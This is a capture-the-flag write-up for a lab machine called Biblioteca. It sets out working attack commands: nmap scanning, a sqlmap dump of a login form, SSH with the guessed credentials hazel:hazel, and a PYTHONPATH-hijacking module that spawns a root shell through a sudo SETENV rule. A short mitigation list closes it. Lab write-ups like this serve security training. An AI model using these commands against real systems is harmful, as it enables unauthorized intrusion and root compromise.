# Biblioteca

**Difficulty:** Medium
**Category:** Web / SQL Injection / Privilege Escalation

---

## Summary

The target exposed SSH on port 22 and a Flask web application on port 8000. SQL injection in the login functionality was exploited using `sqlmap` to obtain Smokey's credentials. After logging into the web application, the Hazel user was identified. The weak-password hint then allowed SSH access as Hazel. The user flag was obtained from Hazel's home directory, followed by privilege escalation through a `sudo`-permitted Python script and `PYTHONPATH` hijacking to obtain root access and the root flag.

## Attack Chain

**Port 8000 → SQL Injection → `sqlmap` dump → Smokey credentials → Web login → Hazel identified → Weak password → SSH as Hazel → User Flag → `sudo SETENV` → `PYTHONPATH` hijacking → Root Flag**

## Enumeration

```bash id="a1q4yr"
nmap -p- -sCV -v TARGET_IP
```

Open ports:

```text id="4w8jpn"
22    SSH
8000  HTTP
```

The web application on port 8000 contained a login form.

## Initial Access

The login request was intercepted using Burp Suite and saved as `req`.

```bash id="1b9d4m"
sqlmap -r req --dump
```

SQL injection allowed the `users` table to be dumped, revealing valid credentials for the **Smokey** account.

After logging into the web application as Smokey, the **Hazel** user was identified.

The room provided a **weak password** hint. The weak credentials `hazel:hazel` worked over SSH:

```bash id="z2x5q8"
ssh hazel@TARGET_IP
```

After gaining access as Hazel, the **user flag was obtained from Hazel's home directory**.

## Privilege Escalation

Hazel's sudo permissions were checked:

```bash id="h8q1sm"
sudo -l
```

The following permission was available:

```text id="7w2kcf"
(root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

The `hasher.py` script imported the `hashlib` module:

```python id="f5y6gc"
import hashlib
```

The normal module location was checked:

```bash id="x3b7qv"
python3 -c 'import hashlib; print(hashlib.__file__)'
```

It resolved to:

```text id="d8k1py"
/usr/lib/python3.8/hashlib.py
```

Since `SETENV` allowed control over `PYTHONPATH`, a custom `hashlib.py` was created in `/tmp`:

```bash id="p9w4zn"
cat > /tmp/hashlib.py <<'EOF'
import os
os.system("/bin/bash -p")
EOF
```

The allowed Python script was then executed with `/tmp` as the module search path:

```bash id="r6t2kx"
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

This spawned a root shell. The **root flag was then obtained from the root account's home directory**.

## Mitigation

* Use parameterized SQL queries instead of string-formatted SQL.
* Avoid unnecessary root execution of Python scripts through `sudo`.
* Remove unnecessary `SETENV` permissions.
* Restrict Python module search paths for privileged applications.
